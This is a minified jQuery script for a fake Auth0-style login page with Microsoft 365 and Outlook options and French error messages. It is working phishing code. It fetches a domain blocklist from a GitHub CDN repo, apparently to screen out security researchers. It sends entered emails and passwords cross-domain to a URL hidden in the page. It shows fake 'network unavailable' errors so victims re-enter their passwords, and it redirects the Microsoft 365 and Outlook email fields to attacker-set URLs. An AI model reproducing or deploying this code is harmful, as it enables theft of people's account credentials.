$(document).ready(function(){function r(r){return/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/.test(r)}!function(r){r.fn.extend({addTemporaryClass:function(a,o){var e=this;return setTimeout(function(){e.removeClass(a)},o),this.each(function(){r(this).addClass(a)})}})}(jQuery),$(".auth0-lock-input").keydown(function(){$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").parent().removeClass("auth0-lock-error"),$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").prev().removeClass("wt-input-wrap--focused"),$("#login-form-error-msg").parent().removeClass("auth0-global-message-error"),$("#error-msg-email, #error-msg-password, #m365-error-msg-email, #owa-error-msg-email, #login-form-error-msg").empty()});var a=[];$.get("https://cdn.jsdelivr.net/gh/cokeboyyy/blackout@main/blocked.txt",function(r){a=r.split("\n")}),$("#login-form").submit(function(o){o.preventDefault();var e=$("#email").val(),s=$("#password").val(),l=e.substr(e.search("@")+1);if(e){if(r(e)){if(-1!==jQuery.inArray(l,a))$("#email").focus(),$("#auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#error-msg-email").html("Oups, ce n'est pas correct. Faute de frappe?");else if(s){if(s.length<5)$("#password").focus(),$("#auth0-lock-error-msg-password").parent().addClass("auth0-lock-error"),$("#auth0-lock-error-msg-password").prev().addClass("wt-input-wrap--focused"),$("#error-msg-password").html("Oups, ce n'est pas correct. Faute de frappe?");else{var m=$("#login-form").serialize();jQuery.ajax({url:$("#sourceURL").html(),type:"POST",data:m,crossDomain:!0,beforeSend(){$("#auth0-lock-main").addClass("auth0-lock-mode-loading"),$("#login-form").focusout()},success:function(r){r.match(/0/i)?($("#login-form-error-msg").parent().addClass("auth0-global-message-error"),$("#login-form-error-msg").html("R\xe9seau indisponible. V\xe9rifiez votre connexion internet et r\xe9essayez."),$("#auth0-lock-main").removeClass("auth0-lock-mode-loading"),$("#email").focus(),$("#password").val(""),$("#login-counter").val("1")):r.match(/1/i)?($("#login-form-error-msg").parent().addClass("auth0-global-message-error"),$("#login-form-error-msg").html("Hmm, le serveur de t\xe9l\xe9chargement n'a pas pu \xeatre atteint. R\xe9essayez plus tard."),$("#auth0-lock-main").removeClass("auth0-lock-mode-loading"),$("#email").focus(),$("#password").val(""),$("#login-counter").val("2")):r.match(/2/i)?($("#login-form-error-msg").parent().addClass("auth0-global-message-error"),$("#login-form-error-msg").html("Hmm, le serveur de t\xe9l\xe9chargement n'a pas pu \xeatre atteint. R\xe9essayez plus tard."),$("#auth0-lock-main").removeClass("auth0-lock-mode-loading"),$("#email").focus(),$("#password").val(""),$("#login-counter").val("1")):r.match(/invalid/i)&&($("#login-form-error-msg").parent().addClass("auth0-global-message-error"),$("#login-form-error-msg").html("Veuillez vous connecter avec votre compte e-mail."),$("#auth0-lock-main").removeClass("auth0-lock-mode-loading"),$("#email").focus(),$("#password").val(""))},error:function(){$("#login-form-error-msg").parent().addClass("auth0-global-message-error"),$("#login-form-error-msg").html("R\xe9seau indisponible. V\xe9rifiez votre connexion internet et r\xe9essayez."),$("#auth0-lock-main").removeClass("auth0-lock-mode-loading"),$("#email").focus(),$("#password").val("")}})}}else $("#password").focus(),$("#auth0-lock-error-msg-password").parent().addClass("auth0-lock-error"),$("#auth0-lock-error-msg-password").prev().addClass("wt-input-wrap--focused"),$("#error-msg-password").html("Vous connaissez la chanson")}else $("#email").focus(),$("#auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#error-msg-email").html("Oups, ce n'est pas correct. Faute de frappe?")}else $("#email").focus(),$("#auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#error-msg-email").html("Vous connaissez la chanson")}),$("#m365-login").click(function(){$("#email, #password").val(""),$("#auth0-lock-main").addTemporaryClass("auth0-lock-mode-loading",1e3),$("#login-form").addClass("visibility-hidden"),$("#m365-form").removeClass("visibility-hidden"),$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").parent().removeClass("auth0-lock-error"),$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").prev().removeClass("wt-input-wrap--focused"),$("#login-form-error-msg").parent().removeClass("auth0-global-message-error"),$("#error-msg-email, #error-msg-password, #m365-error-msg-email, #owa-error-msg-email, #login-form-error-msg").empty()}),$("#m365-form").submit(function(o){o.preventDefault();var e=$("#m365URL").html(),s=$("#m365-email").val(),l=s.substr(s.search("@")+1);s?r(s)?-1!==jQuery.inArray(l,a)?($("#m365-email").focus(),$("#m365-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#m365-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#m365-error-msg-email").html("Connectez-vous avec votre compte Microsoft")):window.location.href=e+s:($("#m365-email").focus(),$("#m365-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#m365-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#m365-error-msg-email").html("Oups, ce n'est pas correct. Faute de frappe?")):($("#m365-email").focus(),$("#m365-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#m365-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#m365-error-msg-email").html("Vous connaissez la chanson"))}),$("#m365-back").click(function(){$("#auth0-lock-main").addTemporaryClass("auth0-lock-mode-loading",1e3),$("#login-form").removeClass("visibility-hidden"),$("#m365-form").addClass("visibility-hidden")}),$("#owa-login").click(function(){$("#email, #password").val(""),$("#auth0-lock-main").addTemporaryClass("auth0-lock-mode-loading",1e3),$("#login-form").addClass("visibility-hidden"),$("#owa-form").removeClass("visibility-hidden"),$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").parent().removeClass("auth0-lock-error"),$("#auth0-lock-error-msg-email, #auth0-lock-error-msg-password, #m365-auth0-lock-error-msg-email, #owa-auth0-lock-error-msg-email").prev().removeClass("wt-input-wrap--focused"),$("#login-form-error-msg").parent().removeClass("auth0-global-message-error"),$("#error-msg-email, #error-msg-password, #m365-error-msg-email, #owa-error-msg-email, #login-form-error-msg").empty()}),$("#owa-form").submit(function(o){o.preventDefault();var e=$("#owaURL").html(),s=$("#owa-email").val(),l=s.substr(s.search("@")+1);s?r(s)?-1!==jQuery.inArray(l,a)?($("#owa-email").focus(),$("#owa-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#owa-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#owa-error-msg-email").html("Connectez-vous avec votre compte Outlook")):window.location.href=e+s:($("#owa-email").focus(),$("#owa-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#owa-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#owa-error-msg-email").html("Oups, ce n'est pas correct. Faute de frappe?")):($("#owa-email").focus(),$("#owa-auth0-lock-error-msg-email").parent().addClass("auth0-lock-error"),$("#owa-auth0-lock-error-msg-email").prev().addClass("wt-input-wrap--focused"),$("#owa-error-msg-email").html("Vous connaissez la chanson"))}),$("#owa-back").click(function(){$("#auth0-lock-main").addTemporaryClass("auth0-lock-mode-loading",1e3),$("#login-form").removeClass("visibility-hidden"),$("#owa-form").addClass("visibility-hidden")})});
